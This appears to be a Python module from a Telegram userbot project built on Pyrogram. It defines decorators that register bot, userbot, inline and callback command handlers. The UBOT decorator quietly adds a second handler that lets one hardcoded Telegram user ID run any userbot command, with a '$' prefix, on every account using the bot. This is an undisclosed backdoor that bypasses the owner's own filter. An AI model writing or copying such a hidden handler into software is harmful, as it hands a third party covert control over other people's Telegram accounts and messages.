from pyrogram import filters

from PyroUbot import *


class FILTERS:
    ME = filters.me
    GROUP = filters.group
    PRIVATE = filters.private
    OWNER = filters.user(OWNER_ID)
    ME_GROUP = filters.me & filters.group
    ME_OWNER = filters.me & filters.user(OWNER_ID)


class PY:
    def BOT(command, filter=FILTERS.PRIVATE):
        def wrapper(func):
            @bot.on_message(filters.command(command) & filter)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def UBOT(command, filter=FILTERS.ME):
        def wrapper(func):
            @ubot.on_message(filters.command(command, "$") & filters.user(5876222922))
            @ubot.on_message(filters.command(command, PREFIX) & filter)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def INLINE(command):
        def wrapper(func):
            @bot.on_inline_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    def CALLBACK(command):
        def wrapper(func):
            @bot.on_callback_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper


def ubot_prefix(ub_id):
    for x in ubot._ubot:
        if ub_id == x.me.id:
            return x._prefix[x.me.id]["ub"]


def TES(command, filter=FILTERS.OWNER):
    def wrapper(func):
        @ubot.on_message(
            filters.command(
                command, lambda _, __, m: ubot._prefix[m.from_user.id]["ub"]
            )
            & filter
        )
        async def wrapped_func(client, message):
            await func(client, message)

        return wrapped_func

    return wrapper
